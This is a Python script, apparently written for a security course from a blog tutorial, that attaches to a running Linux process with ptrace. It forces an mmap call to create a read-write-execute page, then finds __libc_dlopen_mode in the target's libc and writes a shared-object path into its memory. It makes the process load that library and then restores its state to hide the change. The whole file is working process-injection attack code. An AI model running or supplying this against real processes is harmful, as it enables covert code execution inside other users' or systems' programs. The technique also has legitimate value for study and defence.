# Huge credit to https://ancat.github.io/python/2019/01/01/python-ptrace.html
import ctypes  # To interface with native APIs to use ptrace
import sys
import os
from elftools.elf.elffile import ELFFile

PTRACE_PEEKTEXT   = 1
PTRACE_PEEKDATA   = 2
PTRACE_POKETEXT   = 4
PTRACE_POKEDATA   = 5
PTRACE_CONT       = 7
PTRACE_SINGLESTEP = 9
PTRACE_GETREGS    = 12
PTRACE_SETREGS    = 13
PTRACE_ATTACH     = 16
PTRACE_DETACH     = 17

class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

pid = int(sys.argv[1])

# Import libc based on the location I found in the week 4 VM (rpm -ql glibc)
libc = ctypes.CDLL('/lib64/libc.so.6')
# Define what ptrace arguments look like
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
# Define what ptrace return types look like
libc.ptrace.restype = ctypes.c_uint64

# Tell the kernel we want to attach
libc.ptrace(PTRACE_ATTACH, pid, None, None)

# Confirm we attached properly
stat = os.waitpid(pid, 0)
if os.WIFSTOPPED(stat[1]):
    if os.WSTOPSIG(stat[1]) == 19:
        print("we attached!")
    else:
        print("stopped for some other signal?? ", os.WSTOPSIG(stat[1]))
        sys.exit(1)

# Set up registers for our mmap call
backup_registers = user_regs_struct()
# Set up registers for resetting our state back
registers        = user_regs_struct()

# Populate the structs we made above
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(backup_registers))
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
# Get the currently executing code (at the instruction pointer, registers.rip)
backup_code = libc.ptrace(PTRACE_PEEKDATA, pid, ctypes.c_void_p(registers.rip), None)

# Set the registers to match the assembly for creating a WRX page with mmap
registers.rax = 9        # sys_mmap
registers.rdi = 0        # offset
registers.rsi = 10       # size
registers.rdx = 7        # map permissions
registers.r10 = 0x22     # anonymous
registers.r8 = 0         # fd
registers.r9 = 0         # fd

# Apply the modifications we made above
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
# Insert syscall at the current rip; 0x050f is the 2B for the instruction
libc.ptrace(PTRACE_POKEDATA, pid, ctypes.c_void_p(registers.rip), 0x050f)
# Have the kernel execute a single instruction and then give back control to us
libc.ptrace(PTRACE_SINGLESTEP, pid, None, None)

# Wait and look at the instruction that mmap gave us back
stat = os.waitpid(pid, 0)
if os.WIFSTOPPED(stat[1]):
    if os.WSTOPSIG(stat[1]) == 5:
        print("SIGTRAP signal")
    else:
        print("stopped for some other signal (no mmap)?? ", os.WSTOPSIG(stat[1]))
        sys.exit(1)

libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
rwx_page = registers.rax
print("rwx page @", hex(rwx_page))

# Put the backup code back in place
libc.ptrace(PTRACE_POKEDATA, pid, ctypes.c_void_p(backup_registers.rip), backup_code)
# Put the backup registers back in place
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(backup_registers))
# Continue executing, process, nothing to see here!
libc.ptrace(PTRACE_CONT, pid, None, None)

# Parse process map files
def load_maps(pid):
    handle = open('/proc/{}/maps'.format(pid), 'r')
    output = []
    for line in handle:
        line = line.strip()
        parts = line.split()
        (addr_start, addr_end) = map(lambda x: int(x, 16), parts[0].split('-'))
        permissions = parts[1]
        offset = int(parts[2], 16)
        device_id = parts[3]
        inode = parts[4]
        map_name = parts[5] if len(parts) > 5 else ''

        mapping = {
            'addr_start':  addr_start,
            'addr_end':    addr_end,
            'size':        addr_end - addr_start,
            'permissions': permissions,
            'offset':      offset,
            'device_id':   device_id,
            'inode':       inode,
            'map_name':    map_name
        }
        output.append(mapping)

    handle.close()
    return output

maps = load_maps(pid)

# Figure out where lib c is being used in the process (look at code pages)
process_libc = filter(
    lambda x: '/libc-' in x['map_name'] and 'r-xp' == x['permissions'],
    maps
)

if not process_libc:
    print("Couldn't locate libc shared object in this process.")
    sys.exit(1)

# Figure out the base address for ASLR and location of file on disk
libc_base     = process_libc[0]['addr_start']
libc_location = process_libc[0]['map_name']
# Open up the ELF file
libc_elf = ELFFile(open(libc_location, 'r'))

# Search for the __libc_dlopen_mode symbol
__libc_dlopen_mode = filter(
    lambda x: x.name == "__libc_dlopen_mode",
    libc_elf.get_section_by_name('.dynsym').iter_symbols()
)

if not __libc_dlopen_mode:
    print("Couldn't find __libc_dlopen_mode in libc")
    sys.exit(1)

# Print it all out
__libc_dlopen_mode = __libc_dlopen_mode[0].entry['st_value']
print("libc base @ ", hex(libc_base))
print("dlopen_mode offset @ ", hex(__libc_dlopen_mode))
__libc_dlopen_mode = __libc_dlopen_mode + libc_base
print("function pointer @ ", __libc_dlopen_mode)

class iovec(ctypes.Structure):
    _fields_ = [
        ("iov_base", ctypes.c_void_p),
        ("iov_len", ctypes.c_ulong)
    ]

# Wrapper for process_vm_writev, I think
def write_process_memory(pid, address, size, data):
    bytes_buffer = ctypes.create_string_buffer('\x00'*size)
    bytes_buffer.raw = data
    local_iovec  = iovec(ctypes.cast(ctypes.byref(bytes_buffer), ctypes.c_void_p), size)
    remote_iovec = iovec(ctypes.c_void_p(address), size)
    bytes_transferred = libc.process_vm_writev(
        pid, ctypes.byref(local_iovec), 1, ctypes.byref(remote_iovec), 1, 0
    )

    return bytes_transferred

# Get the path to the Shared Object file (use cython to write in C)
path = "/home/ancat/bd/fancy.so"
write_process_memory(pid, rwx_page + 100, len(path)+1, path)

# 3
backup_registers = user_regs_struct()
registers        = user_regs_struct()

libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(backup_registers))
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
backup_code = libc.ptrace(PTRACE_PEEKDATA, pid, ctypes.c_void_p(registers.rip), None)

# 4
registers.rdi = rwx_page + 100 # path to .so file
registers.rsi = 1              # RTLD_LAZY
registers.rax = __libc_dlopen_mode

# Apply changes to registers and insert code
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
libc.ptrace(PTRACE_POKEDATA, pid, ctypes.c_void_p(registers.rip), 0xccd0ff)
libc.ptrace(PTRACE_CONT, pid, None, None)

stat = os.waitpid(pid, 0)
if os.WSTOPSIG(stat[1]) == 5:
    print("SIGTRAP (injecting & executing stub)")
else:
    print("stopped for some other signal??", os.WSTOPSIG(stat[1]))
    sys.exit(1)

# 6
libc.ptrace(PTRACE_POKEDATA, pid, ctypes.c_void_p(backup_registers.rip), backup_code)
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(backup_registers))
libc.ptrace(PTRACE_CONT, pid, None, None)

